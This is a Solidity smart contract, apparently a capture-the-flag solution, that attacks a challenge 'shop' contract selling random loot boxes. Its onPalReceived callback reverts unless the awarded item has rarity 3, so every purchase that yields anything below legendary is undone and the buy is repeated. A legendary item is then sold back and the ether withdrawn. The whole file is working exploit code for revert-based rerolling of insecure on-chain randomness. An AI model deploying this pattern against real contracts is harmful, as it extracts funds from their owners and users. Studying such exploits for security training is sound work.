// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IChal {
    function buyBox() external payable returns (uint256);
    function sellLegendary() external;
    function pals(address, uint8) external view returns (uint256);
}

contract RerollReceiver {
    IChal public immutable shop;
    address public immutable owner;

    constructor(address target) {
        shop = IChal(target);
        owner = msg.sender;
    }

    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function buy() external payable onlyOwner {
        require(msg.value == 1 ether, "one ether");
        shop.buyBox{value: 1 ether}();
    }

    function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
        require(msg.sender == address(shop), "not shop");
        require(rarity == 3, "reroll");
        return this.onPalReceived.selector;
    }

    receive() external payable {}

    function redeem() external onlyOwner { shop.sellLegendary(); }

    function withdraw() external onlyOwner {
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok);
    }
}
